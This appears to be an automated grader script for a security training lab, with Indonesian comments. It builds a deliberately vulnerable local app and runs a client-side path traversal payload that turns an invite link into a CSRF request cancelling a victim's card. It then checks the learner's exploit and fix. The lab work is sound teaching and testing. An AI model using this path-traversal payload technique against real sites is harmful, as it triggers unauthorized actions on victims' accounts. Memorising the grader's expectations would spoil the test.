#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 11.

Rantai: CSPT -> CSRF ala Doyensec "CSPT2CSRF" (2024); cerita konkret ala
Erasec (one-click invite -> card cancel).

Halaman /invite?code=X memuat invite.js yang menggabungkan `code` dari query
string ke URL fetch tanpa validasi:
    fetch("/api/invite/" + code + "/check", {method: "POST", ...})
Korban yang mengunjungi link beracun code=123456789/../../cards/<uuid>/cancel?a=
membuat browser membangun:
    /api/invite/123456789/../../cards/<uuid>/cancel?a=/check
yang dinormalisasi browser (WHATWG URL) menjadi:
    POST /api/cards/<uuid>/cancel?a=/check
dengan cookie sesi + header X-XSRF-Token + Origin yang ditempel otomatis
browser. Endpoint cancel dilindungi cookie SameSite, token XSRF synchronizer,
dan cek Origin — ketiganya lolos karena request memang same-origin dengan
otoritas ambient korban. Itulah inti CSPT2CSRF.

"Browser korban" disimulasikan Python secara setia (victim_visit): ambil
halaman invite (server boleh menolak 400), tiru penggabungan URL ala invite.js,
normalisasi dot-segment ala browser, kirim request dengan sesi korban.

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose`
di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - baseline GET / -> 200
      - POST /login (victim/victim123) -> 200 + cookie session & XSRF-TOKEN
      - GET /invite?code=INV123ABC -> 200
      - POST /api/invite/INV123ABC/check -> 200 {"valid": true}
      - GET /api/cards -> 200 daftar kartu
      - serangan referensi (health) -> kartu korban CANCELLED
      - exploit/exploit.py milik learner dijalankan -> mencetak
        VICTIM_CODE: ..., STATUS: 200, CANCELLED_CARD: <uuid>;
        verifier memeriksa status kartu via API secara independen
  FASE 2 (dengan fix/): bangun ulang app dari fix/app, pastikan
      - GET /invite?code=<racun> -> 400 (gerbang fix)
      - simulasi kunjungan korban dengan racun -> kartu TIDAK terbatalkan
      - fungsi normal utuh -> login, /invite?code=INV123ABC, check, cards

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/app/app.py identik byte-per-byte dengan app/app.py -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import json
import os
import re
import shutil
import subprocess
import sys
import time
from http.client import HTTPConnection
from urllib.parse import quote

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
CARD_UUID = "a1b2c3d4-e5f6-4789-abcd-ef0123456789"
VALID_CODE = "INV123ABC"
POISON_CODE = "123456789/../../cards/%s/cancel?a=" % CARD_UUID
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def req(method, path, body=None, headers=None):
    c = HTTPConnection(HOST, PORT, timeout=10)
    try:
        c.request(method, path, body=body, headers=headers or {})
        r = c.getresponse()
        return r.status, r.read()
    finally:
        c.close()


def login_session():
    c = HTTPConnection(HOST, PORT, timeout=10)
    try:
        c.request("POST", "/login",
                  body=json.dumps({"username": "victim", "password": "victim123"}),
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        body = r.read()
        cookies = {}
        for k, v in r.getheaders():
            if k.lower() == "set-cookie":
                name, _, val = v.split(";", 1)[0].partition("=")
                cookies[name.strip()] = val.strip()
        return r.status, cookies, body
    finally:
        c.close()


def normalize_path(path):
    """Normalisasi dot-segment ala browser (WHATWG URL)."""
    segs = []
    for seg in path.split("/"):
        if seg in ("", "."):
            continue
        if seg == "..":
            if segs:
                segs.pop()
            continue
        segs.append(seg)
    return "/" + "/".join(segs)


def browser_fetch_url(code):
    """Replika setia invite.js + browser: gabung tanpa validasi,
    lalu normalisasi dot-segment."""
    raw = "/api/invite/" + code + "/check"
    path_part, _, query = raw.partition("?")
    url = normalize_path(path_part)
    return url + ("?" + query if query else "")


def card_status(cookies):
    st, body = req("GET", "/api/cards/" + CARD_UUID,
                   headers={"Cookie": "session=%s" % cookies.get("session", "")})
    if st != 200:
        return None
    try:
        return json.loads(body.decode()).get("status")
    except Exception:
        return None


def victim_visit(code, cookies):
    """Simulasi kunjungan korban ke link invite beracun.
    -> (status_request_akhir, kartu_terbatalkan)."""
    st, _ = req("GET", "/invite?code=" + quote(code, safe=""))
    if st != 200:
        return st, False
    target = browser_fetch_url(code)
    headers = {
        "Cookie": "session=%s; XSRF-TOKEN=%s" % (cookies.get("session", ""),
                                                cookies.get("XSRF-TOKEN", "")),
        "X-XSRF-Token": cookies.get("XSRF-TOKEN", ""),
        "Origin": "http://127.0.0.1:8080",
    }
    st2, _ = req("POST", target, headers=headers)
    return st2, card_status(cookies) == "cancelled"


def reference_attack():
    """Serangan referensi (health check): login korban, kunjungi link beracun."""
    st, cookies, _ = login_session()
    if st != 200 or "session" not in cookies:
        return None, False
    return victim_visit(POISON_CODE, cookies)


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, body = req("GET", "/")
            if st == 200 and b"Invite demo" in body:
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def parse_exploit_output(out):
    m_code = re.search(r"^VICTIM_CODE:\s*(\S+)\s*$", out, re.MULTILINE)
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_card = re.search(r"^CANCELLED_CARD:\s*(\S+)\s*$", out, re.MULTILINE)
    return ((m_code.group(1) if m_code else None),
            (m_status.group(1) if m_status else None),
            (m_card.group(1) if m_card else None))


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, body = req("GET", "/")
    check("baseline GET / -> 200", st == 200 and b"Invite demo" in body,
          "dapat %s" % st)

    st, cookies, _ = login_session()
    check("fungsi normal: POST /login -> 200 + cookie",
          st == 200 and "session" in cookies and "XSRF-TOKEN" in cookies,
          "dapat %s" % st)

    st, _ = req("GET", "/invite?code=" + VALID_CODE)
    check("fungsi normal: GET /invite?code=INV123ABC -> 200", st == 200,
          "dapat %s" % st)

    st, body = req("POST", "/api/invite/%s/check" % VALID_CODE)
    ok = st == 200 and json.loads(body.decode()).get("valid") is True
    check("fungsi normal: POST /api/invite/INV123ABC/check -> 200 valid",
          ok, "dapat %s" % st)

    st, body = req("GET", "/api/cards",
                   headers={"Cookie": "session=%s" % cookies.get("session", "")})
    ok = st == 200 and CARD_UUID in body.decode()
    check("fungsi normal: GET /api/cards -> 200 daftar kartu", ok,
          "dapat %s" % st)

    log("== [HEALTH] serangan referensi: kunjungan korban ke link beracun ==")
    st2, cancelled = reference_attack()
    check("serangan referensi: kartu korban CANCELLED", cancelled,
          "dapat status=%s cancelled=%s" % (st2, cancelled))
    if not cancelled:
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        compose_down()
        sys.exit(1)

    log("== FASE 1: reset ke pristine segar untuk exploit learner ==")
    compose_down()
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=60, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 60 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    vcode, status, card = parse_exploit_output(p.stdout or "")
    check("exploit mencetak VICTIM_CODE", bool(vcode), "dapat %r" % vcode)
    check("exploit mencetak STATUS: 200", status == "200", "dapat %r" % status)
    check("exploit mencetak CANCELLED_CARD: <uuid>", bool(card),
          "dapat %r" % card)
    _, cookies2, _ = login_session()
    check("verifier independen: kartu CANCELLED via API",
          card_status(cookies2) == "cancelled",
          "dapat %r" % card_status(cookies2))

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "app", "app.py")
    fixed = os.path.join(LAB_DIR, "fix", "app", "app.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/app/app.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, _ = req("GET", "/invite?code=" + quote(POISON_CODE, safe=""))
    check("serangan referensi GAGAL: GET /invite?code=<racun> -> 400",
          st == 400, "dapat %s" % st)

    st, cookies3, _ = login_session()
    _, cancelled = victim_visit(POISON_CODE, cookies3)
    check("serangan referensi GAGAL: kartu TIDAK terbatalkan", not cancelled,
          "cancelled=%s" % cancelled)

    st, _ = req("GET", "/invite?code=" + VALID_CODE)
    check("fungsi normal: GET /invite?code=INV123ABC -> 200", st == 200,
          "dapat %s" % st)
    st, body = req("POST", "/api/invite/%s/check" % VALID_CODE)
    ok = st == 200 and json.loads(body.decode()).get("valid") is True
    check("fungsi normal: POST /api/invite/INV123ABC/check -> 200", ok,
          "dapat %s" % st)

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
